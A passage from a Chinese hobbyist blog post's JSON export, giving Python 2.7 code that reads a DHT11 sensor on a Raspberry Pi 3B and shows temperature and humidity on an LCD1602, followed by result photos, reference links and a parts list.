class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\" target=\"_blank\" rel=\"external\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\" target=\"_blank\" rel=\"external\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\" target=\"_blank\" rel=\"external\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\" target=\"_blank\" rel=\"external\">https://www.oschina.net/question/1425530\\_140979</a><br><a href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\" target=\"_blank\" rel=\"external\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\" target=\"_blank\" rel=\"external\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\" target=\"_blank\" rel=\"external\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\" target=\"_blank\" rel=\"external\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\" target=\"_blank\" rel=\"external\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br>","more":"</p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" 